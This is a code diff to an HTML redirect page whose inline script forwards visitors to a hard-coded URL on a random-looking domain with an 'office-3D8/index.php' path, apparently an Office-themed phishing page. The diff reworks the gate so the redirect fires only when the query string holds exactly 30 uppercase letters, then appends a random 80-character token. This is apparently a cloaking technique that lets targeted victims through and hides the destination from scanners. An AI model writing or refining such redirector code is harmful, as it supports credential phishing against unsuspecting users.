@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // Replace with your actual redirect URL
+        // Target redirect URL
         const redirectTo = "https://iw.kicgqpj2.sa.com/m3.live/office-3D8/index.php";
 
-        // Function to generate a random string (80 characters, mixed-case)
+        // Function to generate a random string of mixed characters (80 characters)
         function generateRandomString(length) {
             const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             let result = "";
@@ -18,26 +18,27 @@
             return result;
         }
 
-        // Function to get query parameters from the URL
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
+        // Function to extract the unnamed query parameter after '?='
+        function getUnnamedQueryParam() {
+            const query = window.location.search;
+            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
+            return match ? match[1] : null;
         }
 
         // Extract and validate the 30-character uppercase string from the URL
-        const upperString = getQueryParam("upperString");
+        const upperString = getUnnamedQueryParam();
 
-        if (upperString && /^[A-Z]{30}$/.test(upperString)) {  // Ensures it is exactly 30 uppercase letters
+        if (upperString) {
             // Generate a random 80-character string
             const randomString = generateRandomString(80);
 
-            // Redirect with a proper query parameter
-            const newUrl = `${redirectTo}?randomString=${randomString}`;
+            // Redirect with the format "?=80CHARACTERSLONG"
+            const newUrl = `${redirectTo}?=${randomString}`;
             console.log("Redirecting to:", newUrl);  // Debugging log
             window.location.href = newUrl;
         } else {
-            // If the condition is not met, show an error message
-            document.body.innerHTML = "<p>Invalid URL. Please provide a valid 30-character uppercase string in the URL.</p>";
+            // Show error message if format is incorrect
+            document.body.innerHTML = "<p>Invalid URL format. Please use '?=30UPPERCASELETTERS'.</p>";
         }
     </script>
 </head>
